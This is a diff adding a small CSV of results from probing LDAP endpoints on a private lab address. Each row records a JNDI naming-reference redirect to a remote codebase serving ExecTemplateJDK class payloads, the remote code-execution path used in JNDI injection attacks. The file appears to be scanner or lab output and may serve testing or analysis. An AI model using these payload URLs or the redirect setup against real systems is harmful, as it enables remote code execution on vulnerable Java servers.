@@ -1,0 +1,5 @@
+ldap_url,valid redirect,response.javaClassName,response.javaCodeBase,response.objectClass,response.javaFactory,payload url
+ldap://192.168.0.25:1389/bttjx2,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.25:8180/,javaNamingReference,ExecTemplateJDK5,http://192.168.0.25:8180/ExecTemplateJDK5.class
+ldap://192.168.0.25:1389/aky0d7,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.25:8180/,javaNamingReference,ExecTemplateJDK8,http://192.168.0.25:8180/ExecTemplateJDK8.class
+ldap://192.168.0.25:1389/kkt7ue,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.25:8180/,javaNamingReference,ExecTemplateJDK7,http://192.168.0.25:8180/ExecTemplateJDK7.class
+ldap://192.168.0.25:1389/qzishv,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.25:8180/,javaNamingReference,ExecTemplateJDK6,http://192.168.0.25:8180/ExecTemplateJDK6.class
